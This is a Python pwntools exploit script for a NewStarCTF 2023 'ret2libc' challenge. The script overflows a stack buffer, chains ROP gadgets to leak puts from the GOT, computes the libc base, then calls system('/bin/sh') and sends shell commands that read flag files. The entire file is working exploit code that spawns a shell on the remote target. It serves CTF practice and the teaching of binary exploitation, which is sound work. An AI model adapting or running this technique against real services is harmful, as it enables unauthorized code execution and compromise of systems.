from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./[NewStarCTF 2023 公开赛道]ret2libc"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

# main: read(0, rbp-0x20, 0x100); saved RIP @ rbp+8
OFFSET = 0x20 + 8

# Binary gadgets / PLT / GOT
POP_RDI = 0x400763       # 5f c3 inside __libc_csu_init: pop rdi; ret
RET = 0x400506           # bare ret for stack alignment
PUTS_PLT = 0x400520
PUTS_GOT = 0x601018
MAIN = 0x400698

# Original challenge image was built on Ubuntu 18.04.
# Fallback: libc6 2.27-3ubuntu1.6.
FALLBACK = {
    "puts": 0x080970,
    "system": 0x04F420,
    "binsh": 0x1B3D88,
}


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 07_newstarctf_2023_ret2libc_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def stage1():
    # ret aligns puts; trailing ret realigns main on re-entry.
    return flat(
        b"A" * OFFSET,
        p64(RET),
        p64(POP_RDI),
        p64(PUTS_GOT),
        p64(PUTS_PLT),
        p64(RET),
        p64(MAIN),
    )


def stage2(system, binsh):
    # Leading ret realigns system().
    return flat(
        b"A" * OFFSET,
        p64(RET),
        p64(POP_RDI),
        p64(binsh),
        p64(system),
    )


def resolve_libc(leak):
    path = LIBC_PATH

    if not path and args.LOCAL:
        path = os.getenv("LOCAL_LIBC", "/lib/x86_64-linux-gnu/libc.so.6")

    if path:
        libc = ELF(path, checksec=False)
        base = leak - libc.symbols["puts"]
        system = base + libc.symbols["system"]
        binsh = base + next(libc.search(b"/bin/sh\x00"))
        return base, system, binsh

    log.warning("LIBC not set; assuming Ubuntu 18.04 libc6 2.27-3ubuntu1.6")
    base = leak - FALLBACK["puts"]
    system = base + FALLBACK["system"]
    binsh = base + FALLBACK["binsh"]
    return base, system, binsh


def exploit():
    p = start()

    p.recvuntil(b"Show me your magic again\n")
    p.send(stage1())

    # main prints this BEFORE returning to our ROP chain. Do not mistake it
    # for the leaked puts address.
    p.recvuntil(b"See you next time\n")
    leak_line = p.recvline().strip(b"\n")
    leak = u64(leak_line.ljust(8, b"\x00"))
    log.info(f"puts leak = {hex(leak)}")

    base, system, binsh = resolve_libc(leak)
    if base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {hex(base)} is not page aligned; "
            "set LIBC=/path/to/matching/libc.so.6"
        )
    log.info(f"libc base={hex(base)} system={hex(system)} binsh={hex(binsh)}")

    p.recvuntil(b"Show me your magic again\n")
    p.send(stage2(system, binsh))

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
